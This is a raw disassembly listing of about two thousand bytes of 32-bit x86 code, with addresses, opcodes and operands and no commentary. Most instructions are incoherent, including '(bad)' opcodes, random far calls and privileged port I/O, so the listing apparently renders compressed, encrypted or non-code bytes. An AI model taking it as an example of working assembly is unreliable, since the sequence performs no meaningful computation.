  41c63d:	bound  eax,QWORD PTR [esi]
  41c63f:	push   cs
  41c640:	pop    esp
  41c641:	mov    esp,0xa58eab5f
  41c646:	sbb    eax,DWORD PTR [ebp+0x6f6dea1f]
  41c64c:	mov    bl,dh
  41c64e:	enter  0x6d50,0xed
  41c652:	test   al,0xe9
  41c654:	imul   ecx,DWORD PTR [esi+0x43],0x8af651db
  41c65b:	call   0x4b80:0x929a8d0
  41c662:	inc    esi
  41c663:	(bad)  [ebp+0x3d]
  41c666:	loopne 0x41c693
  41c668:	fadd   QWORD PTR [eax]
  41c66a:	add    eax,0x5665a29a
  41c66f:	lds    esp,FWORD PTR [ebx]
  41c671:	or     dh,0xbf
  41c674:	aas    
  41c675:	mov    al,ds:0xc3e2ab09
  41c67a:	call   0x2a5a:0xb6d4d470
  41c681:	add    ecx,edx
  41c683:	ficomp WORD PTR [eax+0x3b9277c0]
  41c689:	mov    dh,0x38
  41c68b:	shl    BYTE PTR [ebx+0x37],cl
  41c68e:	test   DWORD PTR [edi+eiz*8+0x6499ce9b],esp
  41c695:	or     eax,0xb0ee47a8
  41c69a:	bound  ebp,QWORD PTR [edi+0x5bffc4ba]
  41c6a0:	(bad)  
  41c6a2:	std    
  41c6a3:	call   0x697:0x6c29bb4a
  41c6aa:	pop    ebx
  41c6ab:	jecxz  0x41c638
  41c6ad:	jmp    0x41c6b6
  41c6af:	lods   eax,DWORD PTR ds:[esi]
  41c6b0:	and    al,0x94
  41c6b2:	call   0x1059:0x60ee5412
  41c6b9:	jne    0x41c681
  41c6bb:	push   cs
  41c6bc:	fldenv [ecx-0xe9f835b]
  41c6c2:	mov    al,ds:0xcc645bb5
  41c6c7:	fwait
  41c6c8:	dec    edx
  41c6c9:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6cb:	int    0x4f
  41c6cd:	sti    
  41c6ce:	outs   dx,DWORD PTR ds:[esi]
  41c6cf:	or     eax,0xf7083951
  41c6d4:	or     DWORD PTR [ebp-0x1],edi
  41c6d7:	cdq    
  41c6d8:	loopne 0x41c736
  41c6da:	out    dx,al
  41c6db:	mov    ecx,0xba040493
  41c6e0:	dec    esp
  41c6e1:	xchg   edi,ebx
  41c6e3:	in     al,dx
  41c6e4:	ss xchg edi,eax
  41c6e6:	jl     0x41c745
  41c6e8:	jp     0x41c73d
  41c6ea:	sbb    edi,ebp
  41c6ec:	sbb    BYTE PTR [eax+0x27],0x8a
  41c6f0:	je     0x41c755
  41c6f2:	sbb    DWORD PTR [ebp+0x366919ea],0x7a
  41c6f9:	sub    al,BYTE PTR [esi+0x2f42f6c]
  41c6ff:	dec    eax
  41c700:	jnp    0x41c709
  41c702:	lods   eax,DWORD PTR ds:[esi]
  41c703:	out    0xef,eax
  41c705:	push   edx
  41c706:	hlt    
  41c707:	jge    0x41c773
  41c709:	cs cs mov ebp,0x5492b484
  41c710:	xchg   BYTE PTR [ebp+0x7722d024],bh
  41c716:	cmp    al,0x35
  41c718:	xchg   edi,eax
  41c719:	lahf   
  41c71a:	mov    ebx,0xbd11ad5
  41c71f:	in     al,dx
  41c720:	mov    BYTE PTR [ecx+0x5],dl
  41c723:	(bad)  
  41c724:	mov    dh,0xa9
  41c726:	mov    BYTE PTR [eax-0x7b],al
  41c729:	or     bh,BYTE PTR [ebx-0x52]
  41c72c:	out    0xd7,eax
  41c72e:	cmp    BYTE PTR [ecx],0x6f
  41c731:	test   al,0x18
  41c733:	mov    ds:0x2a696474,al
  41c738:	sti    
  41c739:	xor    BYTE PTR ds:0xdb374325,dl
  41c73f:	pusha  
  41c740:	data16 jnp 0x41c6f2
  41c743:	jae    0x41c788
  41c745:	pushf  
  41c746:	jno    0x41c7c6
  41c748:	test   DWORD PTR [ecx],edx
  41c74a:	add    ebp,eax
  41c74c:	and    DWORD PTR [esi+edx*1],ecx
  41c74f:	ss rol bh,1
  41c752:	mov    edi,DWORD PTR ss:[ecx-0x28498d89]
  41c759:	jmp    0xbb9f67a
  41c75e:	pop    ebx
  41c75f:	sub    bl,BYTE PTR [esi+0x63]
  41c762:	mov    ebp,0x5afc91fb
  41c767:	(bad)  
  41c768:	gs out 0x92,al
  41c76b:	mov    bh,0xed
  41c76d:	jno    0x41c7af
  41c76f:	rol    BYTE PTR [ebp-0x7e],cl
  41c772:	add    eax,0xd5f48b76
  41c777:	lds    esi,FWORD PTR [esp+edx*2+0xf]
  41c77b:	mov    bh,0xb3
  41c77d:	dec    ebp
  41c77e:	add    edi,eax
  41c780:	les    esp,FWORD PTR [ebx+0x5abf0a85]
  41c786:	push   ebx
  41c787:	cwde   
  41c788:	xchg   ecx,eax
  41c789:	cmp    al,ch
  41c78b:	aas    
  41c78c:	ret    0x64a2
  41c78f:	mov    WORD PTR [edi+0x4d8c10b4],fs
  41c795:	push   esp
  41c796:	inc    ecx
  41c797:	lods   eax,DWORD PTR ds:[esi]
  41c798:	pop    eax
  41c799:	inc    eax
  41c79a:	lods   eax,DWORD PTR ds:[esi]
  41c79b:	and    esp,edi
  41c79d:	cmp    al,0x5f
  41c79f:	in     al,dx
  41c7a0:	xchg   edx,eax
  41c7a1:	adc    BYTE PTR [ecx],ah
  41c7a3:	push   esp
  41c7a4:	pushf  
  41c7a5:	jecxz  0x41c776
  41c7a7:	mov    ebx,0x80fb901e
  41c7ac:	inc    ecx
  41c7ad:	push   ecx
  41c7ae:	ins    BYTE PTR es:[edi],dx
  41c7af:	pop    es
  41c7b0:	aas    
  41c7b1:	sub    al,0x26
  41c7b3:	mov    bh,al
  41c7b5:	mov    ah,0xe2
  41c7b7:	stos   BYTE PTR es:[edi],al
  41c7b8:	adc    BYTE PTR [edx+0xa],dh
  41c7bb:	xchg   DWORD PTR [eax],esp
  41c7bd:	cmp    eax,0xf724717e
  41c7c2:	inc    BYTE PTR [ebp-0x4d26e8cd]
  41c7c8:	adc    dh,BYTE PTR [edi+edx*4]
  41c7cb:	adc    ecx,DWORD PTR [ecx]
  41c7cd:	pop    esp
  41c7ce:	or     al,0x4e
  41c7d0:	push   ebp
  41c7d1:	fsub   QWORD PTR [eax+0x5d]
  41c7d4:	lods   al,BYTE PTR ds:[esi]
  41c7d5:	mov    DWORD PTR [ebp+0x52],eax
  41c7d8:	frstor [eax-0x25]
  41c7db:	sub    DWORD PTR [eax+0x4b],edx
  41c7de:	ja     0x41c7b0
  41c7e0:	pop    ebx
  41c7e1:	mov    esi,0x37d229e1
  41c7e6:	clc    
  41c7e7:	mov    ah,0x90
  41c7e9:	mov    ebp,0x39c406fd
  41c7ee:	(bad)  
  41c7ef:	ins    DWORD PTR es:[edi],dx
  41c7f0:	adc    bh,BYTE PTR ds:0xc78ecf4
  41c7f6:	mov    edi,0x1c8c8b77
  41c7fb:	cli    
  41c7fc:	jp     0x41c78a
  41c7fe:	sar    DWORD PTR [esp+esi*2+0x6544a5ff],1
  41c805:	sub    ah,BYTE PTR [edx+eiz*1-0x6]
  41c809:	les    eax,FWORD PTR [ecx]
  41c80b:	out    0xbd,al
  41c80d:	xchg   BYTE PTR [esi-0x726458c2],al
  41c813:	lods   al,BYTE PTR ds:[esi]
  41c814:	pusha  
  41c815:	sub    bl,BYTE PTR [ecx+0x28766dbf]
  41c81b:	dec    edi
  41c81c:	ror    DWORD PTR [eax-0x227db1cc],1
  41c822:	sbb    cl,dh
  41c824:	in     al,0x5c
  41c826:	push   ebx
  41c827:	scas   al,BYTE PTR es:[edi]
  41c828:	(bad)  
  41c829:	jmp    DWORD PTR [ebx-0x4e493a5c]
  41c82f:	ja     0x41c82f
  41c831:	cwde   
  41c832:	add    BYTE PTR [ebp+edi*8-0x5298e139],0x13
  41c83a:	adc    DWORD PTR fs:[eax+edx*1-0x63],ecx
  41c83f:	xchg   ebx,eax
  41c840:	and    bh,dl
  41c842:	jae    0x41c881
  41c844:	inc    ebx
  41c845:	push   0x70b2bde1
  41c84a:	stc    
  41c84b:	fisub  WORD PTR [ecx-0x5b]
  41c84e:	jne    0x41c7f1
  41c850:	inc    ebx
  41c851:	jno    0x41c892
  41c853:	jae    0x41c7f5
  41c855:	lea    eax,[esi-0x43814967]
  41c85b:	iret   
  41c85c:	xor    BYTE PTR [eax-0x6522e7ac],0x78
  41c863:	aad    0xa1
  41c865:	cmp    cl,BYTE PTR [edx-0x1ef94d91]
  41c86b:	add    eax,0x9dea75ee
  41c870:	fdiv   QWORD PTR [esi+0x4492655c]
  41c876:	mov    ah,0x8c
  41c878:	loope  0x41c867
  41c87a:	iret   
  41c87b:	je     0x41c873
  41c87d:	lods   eax,DWORD PTR ds:[esi]
  41c87e:	mov    ds:0x6854e9a6,al
  41c883:	sub    BYTE PTR [ebx],ah
  41c885:	lahf   
  41c886:	dec    eax
  41c887:	push   0xaa8d7bfa
  41c88c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c88d:	adc    edx,edx
  41c88f:	xchg   edx,eax
  41c890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c891:	xchg   ecx,eax
  41c892:	fwait
  41c893:	sub    bl,BYTE PTR cs:[ecx+0x650b2351]
  41c89a:	fdivr  DWORD PTR [edx-0x3e]
  41c89d:	int    0x3
  41c89f:	ror    DWORD PTR [ebx-0x50f0f3b3],0xc1
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0xd8bb88e2
  41c8c2:	mov    ebp,0x185af16
  41c8c7:	add    bh,ah
  41c8c9:	add    DWORD PTR [eax],eax
  41c8cb:	add    dl,ch
  41c8cd:	sbb    al,0xf1
  41c8cf:	push   esp
  41c8d0:	cmp    al,0x28
  41c8d2:	and    al,0x7d
  41c8d4:	(bad)  
  41c8d5:	sub    dl,BYTE PTR [edx-0x63]
  41c8d8:	pop    ds
  41c8d9:	adc    eax,0x5f2dceb4
  41c8de:	jbe    0x41c8b4
  41c8e0:	push   edx
  41c8e1:	fstp   st(6)
  41c8e3:	inc    ecx
  41c8e4:	call   eax
  41c8e6:	test   eax,0x68e70345
  41c8eb:	aaa    
  41c8ec:	adc    dh,BYTE PTR [ecx-0x5ca210d]
  41c8f2:	cmp    BYTE PTR [ebx],dh
  41c8f4:	sahf   
  41c8f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8f6:	test   DWORD PTR [ecx+0x3],0xb03d908e
  41c8fd:	adc    edx,0x5f55dd84
  41c903:	(bad)  
  41c904:	lea    esp,[ecx-0x36e7171f]
  41c90a:	or     eax,0xc779219e
  41c90f:	mov    dl,0xfb
  41c911:	jmp    0x1ab2:0x4fca5e32
  41c918:	mov    esp,0xd12d0e3a
  41c91d:	dec    edi
  41c91e:	pop    ecx
  41c91f:	and    bh,BYTE PTR [edx-0x2df4804e]
  41c925:	xor    eax,0xa0061bcd
  41c92a:	dec    ebx
  41c92b:	fdiv   QWORD PTR [ebx+0x12]
  41c92e:	imul   ebp,DWORD PTR [ebp+eax*8-0x35a1bbe1],0x727005e5
  41c939:	jg     0x41c8f2
  41c93b:	inc    eax
  41c93c:	dec    edi
  41c93d:	pushf  
  41c93e:	mov    BYTE PTR [ebx+0x3d2023a],dh
  41c944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c945:	arpl   WORD PTR [ecx],di
  41c947:	pop    ds
  41c948:	retf   
  41c949:	xchg   DWORD PTR [ecx],eax
  41c94b:	xor    ah,BYTE PTR cs:[ebx-0x295ed36c]
  41c952:	or     ch,ah
  41c954:	shl    DWORD PTR [edx-0x1dca883a],cl
  41c95a:	bound  ecx,QWORD PTR [ebx-0x6cd979af]
  41c960:	test   al,0xf6
  41c962:	(bad)  
  41c963:	push   ds
  41c964:	fistp  QWORD PTR [esi]
  41c966:	push   cs
  41c967:	nop
  41c968:	push   0x730072c6
  41c96d:	pop    ss
  41c96e:	sbb    DWORD PTR [edx+0x60fb74d6],ebp
  41c974:	push   DWORD PTR [edx-0x76]
  41c977:	pop    esp
  41c978:	rcl    DWORD PTR [eax+0x9],0xe8
  41c97c:	and    DWORD PTR [esi+0x70949b1d],eax
  41c982:	push   es
  41c983:	pop    edi
  41c984:	sbb    ah,BYTE PTR [ecx-0x72]
  41c987:	(bad)  
  41c989:	dec    ebp
  41c98a:	jmp    0x7312a1c3
  41c98f:	xlat   BYTE PTR ds:[ebx]
  41c990:	cmp    ah,BYTE PTR [eax]
  41c992:	jecxz  0x41c91d
  41c994:	call   0x8241ed70
  41c999:	pop    es
  41c99a:	fnstenv [edi]
  41c99c:	rcl    DWORD PTR [ebp+0x2d23a9ec],1
  41c9a2:	inc    esi
  41c9a3:	adc    bl,al
  41c9a5:	xchg   edi,eax
  41c9a6:	cli    
  41c9a7:	push   ds
  41c9a8:	inc    esi
  41c9a9:	or     BYTE PTR [esi],cl
  41c9ab:	adc    BYTE PTR [edx],ch
  41c9ad:	xchg   bl,al
  41c9af:	push   ss
  41c9b0:	cmp    ecx,edx
  41c9b2:	push   0x35
  41c9b4:	cli    
  41c9b5:	loope  0x41c9a9
  41c9b7:	mov    cl,0xbd
  41c9b9:	jl     0x41c9a7
  41c9bb:	xchg   DWORD PTR [ecx+0x4a44a8bf],ebp
  41c9c1:	dec    edi
  41c9c2:	dec    esi
  41c9c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9c4:	sub    esp,DWORD PTR [ecx+eax*2+0x25edf088]
  41c9cb:	push   ebx
  41c9cc:	sahf   
  41c9cd:	jg     0x41c96d
  41c9cf:	jecxz  0x41c9e5
  41c9d1:	inc    edi
  41c9d2:	jns    0x41c980
  41c9d4:	ret    
  41c9d5:	test   esi,ebx
  41c9d7:	out    0xa3,eax
  41c9d9:	dec    bh
  41c9db:	or     al,0xfa
  41c9dd:	pop    edx
  41c9de:	mov    ds:0x4d1eeb63,al
  41c9e3:	loope  0x41ca44
  41c9e5:	mov    cl,0x3c
  41c9e7:	mov    BYTE PTR [eax-0x24],dh
  41c9ea:	inc    ecx
  41c9eb:	jnp    0x41ca07
  41c9ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9ee:	mov    esi,0xd0054942
  41c9f3:	(bad)  
  41c9f4:	xlat   BYTE PTR ds:[ebx]
  41c9f5:	imul   DWORD PTR [ecx+0x7c530b4b]
  41c9fb:	ror    BYTE PTR [ecx],0xcf
  41c9fe:	fbstp  TBYTE PTR [ebp+edi*8-0x17]
  41ca02:	sub    al,0xc7
  41ca04:	pop    ecx
  41ca05:	loop   0x41c98d
  41ca07:	(bad)  
  41ca08:	dec    esi
  41ca09:	inc    eax
  41ca0a:	stos   DWORD PTR es:[edi],eax
  41ca0b:	push   0xfffffffb
  41ca0d:	mov    al,ds:0x79613530
  41ca12:	jle    0x41c9fe
  41ca14:	inc    eax
  41ca15:	(bad)  
  41ca16:	jns    0x41ca74
  41ca18:	out    0x25,al
  41ca1a:	out    dx,al
  41ca1b:	cld    
  41ca1c:	lock jl 0x41c9c8
  41ca1f:	xor    ah,ch
  41ca21:	add    esp,ebp
  41ca23:	ret    
  41ca24:	jb     0x41ca31
  41ca26:	fiadd  DWORD PTR [eax-0x17]
  41ca29:	frstor [edi+0x7df20f47]
  41ca2f:	fs dec ebp
  41ca31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca32:	sub    eax,0x80e00c84
  41ca37:	fcomp  QWORD PTR [edi+0x4e]
  41ca3a:	push   ds
  41ca3b:	pop    ecx
  41ca3c:	ins    DWORD PTR es:[edi],dx
  41ca3d:	nop
  41ca3e:	cmp    ecx,DWORD PTR [edi]
  41ca40:	idiv   DWORD PTR [edx-0x64]
  41ca43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca44:	test   DWORD PTR [edx],ecx
  41ca46:	sbb    esi,esp
  41ca48:	fisubr DWORD PTR [edi]
  41ca4a:	loop   0x41c9d3
  41ca4c:	push   edi
  41ca4d:	sub    esi,DWORD PTR [edi+0x10128f35]
  41ca53:	push   es
  41ca54:	add    edx,DWORD PTR [ebx+0x2776de93]
  41ca5a:	out    dx,al
  41ca5b:	int    0xa8
  41ca5d:	dec    ecx
  41ca5e:	mov    ebx,esp
  41ca60:	adc    bh,dl
  41ca62:	xchg   esp,eax
  41ca63:	call   0x56d5:0xa92d1e89
  41ca6a:	mov    esp,0x328fc36e
  41ca6f:	clc    
  41ca70:	jmp    0x41ca37
  41ca72:	iret   
  41ca73:	aam    0xb3
  41ca75:	xchg   esp,eax
  41ca76:	(bad)  
  41ca77:	fsubr  DWORD PTR [eax+0x1a]
  41ca7a:	mov    ds:0x42a9d1a0,al
  41ca7f:	fwait
  41ca80:	jns    0x41ca41
  41ca82:	fadd   QWORD PTR [edi+eax*8-0x56a9d00b]
  41ca89:	imul   ebx,DWORD PTR [edx+0x65],0xcb1e9efd
  41ca90:	mov    edi,0xd4a72f1
  41ca95:	cmp    ecx,ebx
  41ca97:	outs   dx,BYTE PTR ds:[esi]
  41ca98:	fidiv  WORD PTR [esp+edx*4-0x23]
  41ca9c:	jae    0x41ca69
  41ca9e:	enter  0xb73a,0x84
  41caa2:	cmp    DWORD PTR [ebx+ecx*4],esp
  41caa5:	push   ecx
  41caa6:	xor    ax,0x2f29
  41caaa:	in     eax,0x62
  41caac:	and    ebx,DWORD PTR [eax+0x13]
  41caaf:	xor    dl,BYTE PTR [ecx]
  41cab1:	pop    ss
  41cab2:	mov    DWORD PTR [eax],eax
  41cab4:	shr    DWORD PTR [esp+edx*1],1
  41cab7:	adc    edi,ebp
  41cab9:	cmp    edx,edi
  41cabb:	out    dx,al
  41cabc:	pop    edi
  41cabd:	xchg   bx,ax
  41cabf:	push   0x818f9f88
  41cac4:	xchg   esi,eax
  41cac5:	xchg   DWORD PTR [ecx],eax
  41cac7:	add    bh,ah
  41cac9:	add    DWORD PTR [eax],eax
  41cacb:	add    BYTE PTR [ebp-0x17],bl
  41cace:	mov    bl,0x4a
  41cad0:	mov    BYTE PTR [ebp+eiz*4+0x25],dh
  41cad4:	cdq    
  41cad5:	int    0x24
  41cad7:	xor    dh,al
  41cad9:	add    bh,BYTE PTR [edx-0x50]
  41cadc:	cld    
  41cadd:	outs   dx,DWORD PTR ds:[esi]
  41cade:	int    0xf1
  41cae0:	fs push eax
  41cae2:	add    BYTE PTR [edx-0x58],ah
  41cae5:	outs   dx,DWORD PTR ds:[esi]
  41cae6:	push   ss
  41cae7:	pop    es
  41cae8:	mov    ebp,?
  41caea:	mov    ah,0xb2
  41caec:	dec    esp
  41caed:	icebp  
  41caee:	addr16 loop 0x41cae6
  41caf1:	ds jnp 0x41caa7
  41caf4:	scas   eax,DWORD PTR es:[edi]
  41caf5:	mov    esi,0xcc4b2f32
  41cafa:	add    eax,0x296e4fa8
  41caff:	push   edx
  41cb00:	cdq    
  41cb01:	imul   edi,DWORD PTR [edi*4+0x1dbbb03e],0x44
  41cb09:	enter  0x2c58,0x31
  41cb0d:	xchg   ebx,eax
  41cb0e:	cmc    
  41cb0f:	fld    DWORD PTR [eax]
  41cb11:	dec    BYTE PTR [eax-0x76c3643f]
  41cb17:	loope  0x41cab3
  41cb19:	mov    al,ds:0x950db454
  41cb1e:	pop    esp
  41cb1f:	xchg   ebx,esp
  41cb21:	inc    ebx
  41cb22:	cmp    ebp,esp
  41cb24:	loope  0x41cb70
  41cb26:	jo     0x41cb59
  41cb28:	jp     0x41cb47
  41cb2a:	mov    ebx,0xd2d0e98f
  41cb2f:	(bad)  [ebp-0x25611338]
  41cb35:	dec    ebp
  41cb36:	ficom  DWORD PTR es:[edx+ecx*1+0x4d]
  41cb3b:	std    
  41cb3c:	jae    0x41cbbd
  41cb3e:	fst    DWORD PTR [edi-0x7f]
  41cb41:	aas    
  41cb42:	out    0x40,al
  41cb44:	inc    esi
  41cb45:	or     DWORD PTR [ebp+0x6e],ecx
  41cb48:	outs   dx,DWORD PTR ds:[esi]
  41cb49:	xor    ecx,edx
  41cb4b:	cmp    al,0x82
  41cb4d:	adc    eax,0xf62d5c8c
  41cb52:	mov    ah,0xd6
  41cb54:	xchg   ebp,eax
  41cb55:	fcomp  st(3)
  41cb57:	jbe    0x41cb9a
  41cb59:	div    ebx
  41cb5b:	jmp    0x198cd939
  41cb60:	test   BYTE PTR [ecx-0x45],dh
  41cb63:	iret   
  41cb64:	add    eax,0x7e3103da
  41cb69:	pop    ss
  41cb6a:	lock fs shl edx,cl
  41cb6e:	nop
  41cb6f:	adc    DWORD PTR [ebp+0x15],0x4b
  41cb73:	sbb    ebx,DWORD PTR [edx+0x7a]
  41cb76:	jbe    0x41cb94
  41cb78:	arpl   WORD PTR [ebx-0x128936be],di
  41cb7e:	hlt    
  41cb7f:	mul    cl
  41cb81:	jb     0x41cbe5
  41cb83:	test   BYTE PTR [esp+ebp*2+0x4d851f56],ch
  41cb8a:	es popa 
  41cb8c:	mov    bh,0x2f
  41cb8e:	icebp  
  41cb8f:	mov    DWORD PTR [ebx-0x64],edi
  41cb92:	or     eax,0x59a49dca
  41cb97:	into   
  41cb98:	ins    BYTE PTR es:[edi],dx
  41cb99:	(bad)  
  41cb9b:	stos   BYTE PTR es:[edi],al
  41cb9c:	fist   WORD PTR [edi-0x34f7c90c]
  41cba2:	jne    0x41cbca
  41cba4:	cdq    
  41cba5:	jmp    0x1823:0x75a46fee
  41cbac:	mov    edi,0x21cc398f
  41cbb1:	jg     0x41cbe1
  41cbb3:	bound  edi,QWORD PTR [edi-0x5967e3df]
  41cbb9:	aam    0x3a
  41cbbb:	mov    al,0x3
  41cbbd:	cmp    ebp,edi
  41cbbf:	call   0x13e6b3e
  41cbc4:	push   0x95f405bc
  41cbc9:	arpl   WORD PTR [ecx+0xc],ax
  41cbcc:	mov    ebx,ecx
  41cbce:	pop    edx
  41cbcf:	pop    edx
  41cbd0:	out    dx,eax
  41cbd1:	ins    DWORD PTR es:[edi],dx
  41cbd2:	inc    edi
  41cbd3:	into   
  41cbd4:	test   DWORD PTR [ebx-0x40b4a661],0x9bd31623
  41cbde:	xchg   ebp,eax
  41cbdf:	jge    0x41cbf2
  41cbe1:	imul   DWORD PTR [eax-0x77]
  41cbe4:	sub    BYTE PTR [eax-0x57],dh
  41cbe7:	sbb    al,0x61
  41cbe9:	bound  edx,QWORD PTR [edx+0x76]
  41cbec:	jle    0x41cb96
  41cbee:	mov    edi,0x86ae3ced
  41cbf3:	fsub   DWORD PTR [esi+0x2c]
  41cbf6:	out    0x44,al
  41cbf8:	mov    WORD PTR [ecx+0x2a758e4b],?
  41cbfe:	sbb    eax,0x10e0f563
  41cc03:	std    
  41cc04:	fwait
  41cc05:	xchg   esi,eax
  41cc06:	in     al,dx
  41cc07:	push   edx
  41cc08:	clc    
  41cc09:	je     0x41cc82
  41cc0b:	push   0x4a2bddd2
  41cc10:	jle    0x41cbf6
  41cc12:	mov    edi,DWORD PTR [edi-0x24]
  41cc15:	xor    dh,BYTE PTR [eax]
  41cc17:	wrmsr  
  41cc19:	aaa    
  41cc1a:	jmp    0x96f137e8
  41cc1f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc21:	sub    ah,BYTE PTR [ebx]
  41cc23:	fxch   st(4)
  41cc25:	and    BYTE PTR [edx-0x7e],dl
  41cc28:	test   al,0x8f
  41cc2a:	fwait
  41cc2b:	in     al,dx
  41cc2c:	and    al,0xf7
  41cc2e:	sub    eax,ecx
  41cc30:	sub    al,dh
  41cc32:	and    esi,edi
  41cc34:	mov    al,0x95
  41cc36:	xor    esp,DWORD PTR [ecx+0x68]
  41cc39:	jo     0x41cc45
  41cc3b:	sbb    eax,0x649701bc
  41cc40:	mov    eax,0xe8e49825
  41cc45:	mov    esi,0x39293a54
  41cc4a:	rcl    DWORD PTR [edi],cl
  41cc4c:	xor    BYTE PTR [esi-0x72],ch
  41cc4f:	imul   edx,DWORD PTR [esi],0x7a
  41cc52:	add    BYTE PTR [ebx+0x64],cl
  41cc55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc56:	out    0x1,eax
  41cc58:	in     eax,dx
  41cc59:	retf   0x7c7f
  41cc5c:	ror    BYTE PTR [esi-0x6c9c1784],cl
  41cc62:	es fwait
  41cc64:	mov    edi,0x66a44dc3
  41cc69:	loope  0x41ccdd
  41cc6b:	int    0x5f
  41cc6d:	cmp    eax,0xe75ce5b8
  41cc72:	cmp    eax,0x742cb173
  41cc77:	sbb    ebp,edi
  41cc79:	cmc    
  41cc7a:	call   0x6134:0xe153fb2a
  41cc81:	sub    BYTE PTR es:[ebp-0x79b8b92a],0x42
  41cc89:	sbb    eax,0x3834cfeb
  41cc8e:	pushf  
  41cc8f:	arpl   WORD PTR [edi+edx*4],bp
  41cc92:	push   ebp
  41cc93:	call   0x59ec:0x2049cb96
  41cc9a:	xor    DWORD PTR [ecx],esp
  41cc9c:	fucomi st,st(4)
  41cc9e:	cmc    
  41cc9f:	xor    ecx,edx
  41cca1:	dec    eax
  41cca2:	enter  0xcd02,0x8b
  41cca6:	js     0x41ccb5
  41cca8:	add    dh,ah
  41ccaa:	hlt    
  41ccab:	jb     0x41cc61
  41ccad:	and    ebp,edi
  41ccaf:	cmc    
  41ccb0:	je     0x41cd25
  41ccb2:	sahf   
  41ccb3:	add    BYTE PTR [edi],bl
  41ccb5:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ccbb:	sub    eax,esi
  41ccbd:	add    BYTE PTR [edi+eax*2+0x6f44ffed],0x7d
  41ccc5:	mov    DWORD PTR [ecx],eax
  41ccc7:	add    bh,ah
  41ccc9:	add    DWORD PTR [eax],eax
  41cccb:	add    bl,dh
  41cccd:	js     0x41cd1e
  41cccf:	aam    0x59
  41ccd1:	and    DWORD PTR [ebx],ecx
  41ccd3:	retf   0x81e6
  41ccd6:	pusha  
  41ccd7:	mov    ecx,0xf5160b9
  41ccdc:	jno    0x41ccda
  41ccde:	and    al,0xfe
  41cce0:	fldenv [esi+0x35]
  41cce3:	fs xchg ecx,ecx
  41cce6:	(bad)  [ebp+ebx*4-0x17]
  41ccea:	dec    esp
  41cceb:	push   cs
  41ccec:	push   ebx
  41cced:	test   eax,0x51dd48dc
  41ccf2:	out    dx,eax
  41ccf3:	arpl   WORD PTR [esi-0x26c11dcc],si
  41ccf9:	gs jmp 0x181d:0x9bf4604e
  41cd01:	mov    ch,0x33
  41cd03:	stos   BYTE PTR es:[edi],al
  41cd04:	lahf   
  41cd05:	pop    ebx
  41cd06:	dec    edx
  41cd07:	ss xchg esp,eax
  41cd09:	mov    esi,0xb8ae504d
  41cd0e:	fisubr DWORD PTR [ecx]
  41cd10:	or     BYTE PTR [eax+eiz*8-0xd],0xe4
  41cd15:	mov    eax,0x105e1ce9
  41cd1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd1b:	jmp    0x97e5495
  41cd20:	inc    esi
  41cd21:	iret   
  41cd22:	into   
  41cd23:	sub    edi,DWORD PTR [ecx+0x41]
  41cd26:	sbb    al,0x6d
  41cd28:	add    al,dl
  41cd2a:	mov    DWORD PTR [ebx],ecx
  41cd2c:	push   esp
  41cd2d:	ffreep st(1)
  41cd2f:	dec    eax
  41cd30:	lea    ebx,[ecx+0x45]
  41cd33:	mov    edi,0x59d8024f
  41cd38:	ds in  eax,0x35
  41cd3b:	daa    
  41cd3c:	(bad)  
  41cd3d:	ss loope 0x41cce1
  41cd40:	fild   DWORD PTR [edi+0xdb0f365]
  41cd46:	inc    ecx
  41cd47:	ja     0x41cd6f
  41cd49:	pop    ss
  41cd4a:	or     ch,BYTE PTR [ecx-0x24]
  41cd4d:	push   ss
  41cd4e:	xor    al,0xe7
  41cd50:	jecxz  0x41cdc1
  41cd52:	cwde   
  41cd53:	daa    
  41cd54:	stc    
  41cd55:	stos   BYTE PTR es:[edi],al
  41cd56:	and    al,0x78
  41cd58:	xor    al,0xf7
  41cd5a:	cmp    bl,bl
  41cd5c:	sbb    ah,ch
  41cd5e:	dec    esi
  41cd5f:	add    ebp,esi
  41cd61:	out    dx,eax
  41cd62:	add    al,0xe4
  41cd64:	sub    DWORD PTR [ebx+0x30b20ee6],ebp
  41cd6a:	adc    ah,BYTE PTR [ecx+0x54]
  41cd6d:	add    BYTE PTR [esi+0x36],al
  41cd70:	xchg   ebx,edi
  41cd72:	xchg   esi,eax
  41cd73:	test   DWORD PTR [eax-0x47e38847],ebx
  41cd79:	ja     0x41cda6
  41cd7b:	add    BYTE PTR [ebp-0x5a0139da],0x81
  41cd82:	dec    esi
  41cd83:	cld    
  41cd84:	int3   
  41cd85:	push   ecx
  41cd86:	inc    ebp
  41cd87:	aam    0xae
  41cd89:	(bad)  
  41cd8b:	cmp    DWORD PTR [ebx-0x27],0xf40a286f
  41cd92:	sub    eax,0x8bee80d4
  41cd97:	push   cs
  41cd98:	loopne 0x41cdfc
  41cd9a:	xor    al,0x1
  41cd9c:	call   0x4b86:0x7ac99747
  41cda3:	cmp    cl,bl
  41cda5:	pop    esi
  41cda6:	nop
  41cda7:	or     dh,BYTE PTR [esi]
  41cda9:	in     eax,dx
  41cdaa:	inc    eax
  41cdab:	and    eax,0x9a779753
  41cdb0:	test   DWORD PTR [esi],0x5732b5c1
  41cdb6:	sbb    ebx,DWORD PTR [eax-0x757a48e1]
  41cdbc:	mov    ah,0x8f
  41cdbe:	jmp    0x91fb5da5
  41cdc3:	popa   
